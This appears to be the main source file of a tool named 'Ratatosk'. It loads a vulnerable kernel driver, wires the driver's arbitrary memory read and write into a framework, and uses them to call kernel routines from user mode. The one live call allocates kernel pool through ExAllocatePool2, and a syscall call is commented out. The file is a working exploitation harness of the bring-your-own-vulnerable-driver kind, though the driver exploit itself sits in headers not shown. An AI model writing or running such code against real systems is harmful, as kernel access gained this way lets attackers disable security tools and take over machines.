#include "ratatosk.h"
#include "ReadWriteLibrary/VulnerableDriverReadWrite.h"


int main() {
    DbgLog("[main] Ratatosk v1.0\n");

    VulnerableDriver driver;
    Ratatosk ratatosk;

    driver.EnablePrimitives();

    ratatosk.SetReadPrimitive([&](UINT64* dst, UINT64 addr, UINT64 size) { driver.Read(dst, addr, size); });
    ratatosk.SetWritePrimitive([&](UINT64 addr, UINT64 data) { driver.Write(addr, data); });

    if (!ratatosk.Initialize()) { driver.CleanUp(); return 1; }



    /*
    //##################### 0x1337 Usermode Kernel Chudmaxing #####################

	UINT64 outBuf = (UINT64) new UINT64[0x8];

    UINT64 sysInfoResult = ratatosk.CallSyscall("NtQuerySystemInformation", {0, outBuf, 0x40, 0});

    UINT32 pageSize    = *(UINT32*)(outBuf + 0x08);
    UINT8  numCpus     = *(UINT8* )(outBuf + 0x38);
    UINT64 maxUserAddr = *(UINT64*)(outBuf + 0x28);

    printf("[ZwQuerySystemInformation] return=0x%llX  PageSize=0x%X  NumCpus=%u  MaxUserAddr=0x%llX\n", sysInfoResult, pageSize, numCpus, maxUserAddr);




    Sleep(2000);*/

    // ExAllocatePool2(POOL_FLAGS, SIZE_T, ULONG Tag)
    // POOL_FLAG_NON_PAGED = 0x40
    UINT64 poolBuf = ratatosk.CallKFunc("ExAllocatePool2", { 0x40ULL, 256ULL, (UINT64)'1cbA' });
    printf("[ExAllocatePool2] buffer=0x%llX\n", poolBuf);




    driver.CleanUp();
    DbgLog("[main] Done\n");
    return 0;
}
